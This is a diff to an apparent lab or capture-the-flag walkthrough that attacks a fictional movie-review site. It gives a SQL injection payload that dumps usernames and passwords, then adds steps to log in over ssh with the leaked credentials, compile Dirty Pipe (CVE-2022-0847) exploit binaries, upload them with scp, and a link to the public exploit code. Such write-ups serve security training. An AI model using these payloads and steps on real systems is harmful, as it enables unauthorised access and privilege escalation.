@@ -28,6 +28,30 @@ Exploit the SQL injection to get users:
 a%' UNION SELECT NULL AS id, 'leaked' AS user, username AS title, password AS comment, 0.0 AS rating FROM users --
 ```
 
+### Dirty Pipe exploit
+
+ssh into the server using leaked credentials
+```bash
+ssh Timmy@timmy-and-friends-movie-reviews.fr -p 2222 
+```
+
+compile the exploit
+```bash
+gcc -o dirty_pipe-1 dirty_pipe-1.c 
+gcc -o dirty_pipe-2 dirty_pipe-2.c 
+```
+send it to the server using scp
+```bash
+scp -P 2222 yourfile.txt Timmy@timmy-and-friends-movie-reviews.fr:~
+```
+
+
 
 
 ![alt text](image.png)
+
+
+--- 
+
+### Dirty pipe exploit code from 
+https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
